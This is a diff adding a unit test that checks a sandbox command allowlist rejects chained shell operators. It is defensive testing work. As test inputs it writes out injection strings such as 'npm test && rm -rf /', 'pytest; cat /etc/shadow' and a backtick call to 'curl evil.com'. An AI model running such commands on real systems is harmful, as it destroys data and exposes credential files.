@@ -25,6 +25,19 @@ def test_command_allowlist_disallowed_dangerous():
     assert sandbox_service.is_command_allowed("git push --force origin main") is False
 
 
+def test_command_allowlist_chained_operators_rejected():
+    """Verify that commands starting with valid prefixes but chaining shell operators are rejected."""
+    assert sandbox_service.is_command_allowed("npm test && rm -rf /") is False
+    assert sandbox_service.is_command_allowed("pytest; cat /etc/shadow") is False
+    assert sandbox_service.is_command_allowed("npm test | bash") is False
+    assert sandbox_service.is_command_allowed("pytest $(whoami)") is False
+    assert sandbox_service.is_command_allowed("npm test `curl evil.com`") is False
+    assert sandbox_service.is_command_allowed("pytest\nrm -rf /") is False
+    assert sandbox_service.is_command_allowed("npm test > /dev/null") is False
+    assert sandbox_service.is_command_allowed("npm test < input.txt") is False
+    assert sandbox_service.is_command_allowed("npm testing_nonexistent") is False
+
+
 @pytest.mark.anyio
 async def test_sandbox_run_disallowed_command_rejected():
     result = await sandbox_service.run_tests(
